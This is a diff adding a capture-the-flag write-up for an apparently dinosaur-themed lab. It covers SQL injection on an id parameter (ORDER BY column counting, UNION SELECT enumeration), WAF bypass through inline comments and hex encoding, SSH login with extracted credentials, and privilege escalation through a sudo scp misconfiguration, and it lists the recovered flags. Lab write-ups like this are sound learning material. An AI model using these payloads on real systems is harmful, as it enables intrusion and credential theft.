@@ -42,3 +42,106 @@ Vulnerable Endpoint
 ```bash
 item.php?id=2
 ```
+A numeric parameter often indicates backend SQL queries.
+
+
+💉 SQL Injection Discovery
+
+Used ORDER BY testing to determine the number of columns.
+```bash
+?id=2 ORDER BY 1--
+?id=2 ORDER BY 2--
+?id=2 ORDER BY 3--
+?id=2 ORDER BY 4--
+?id=2 ORDER BY 5--
+?id=2 ORDER BY 6--
+```
+Result
+
+Error on column 6, meaning the query had 5 columns.
+
+🧠 Database Enumeration
+```bash
+?id=2 UNION SELECT 1,database(),3,4,5--
+```
+```bash
+park
+```
+
+```bash
+?id=2 UNION SELECT 1,version(),3,4,5--
+```
+
+```bash
+Ubuntu 16.04
+```
+
+🛡️ WAF Bypass
+
+Blocked payloads were bypassed using:
+
+Inline SQL comments instead of spaces
+Hexadecimal encoded strings
+
+Example:
+
+```bash
+users = 0x7573657273
+```
+
+🔑 Credential Extraction
+
+Recovered credentials:
+
+```bash
+Username: dennis
+Password: ih8dinos
+```
+💻 Initial Access
+
+Used SSH to log in:
+```bash
+ssh dennis@TARGET_IP
+```
+
+📂 Local Enumeration
+
+Flags were found through:
+
+Home directory files
+.viminfo
+.bash_history
+
+🚀 Privilege Escalation
+
+Checking sudo permissions:
+```bash
+sudo -l
+```
+Result: 
+```bash
+(ALL) NOPASSWD: /usr/bin/scp
+```
+This allowed reading files as root.
+
+👑 Root Flag
+```bash
+sudo scp /root/flag5.txt /tmp/flag5.txt
+cat /tmp/flag5.txt
+```
+🏁 Recovered Flags
+```bash
+Flag 1: b89f2d69c56b9981ac92dd267f
+Flag 2: 96ccd6b429be8c9a4b501c7a0b117b0a
+Flag 3: b4973bbc9053807856ec815db25fb3f1
+Flag 5: 2a7074e491fcacc7eeba97808dc5e2ec
+```
+📌 Conclusion
+
+This room was a great example of how:
+
+SQL Injection → Credential Theft
+SSH Access → Local Enumeration
+Misconfigured sudo → Root Access
+
+A complete attack chain from small mistakes. 🦖💀
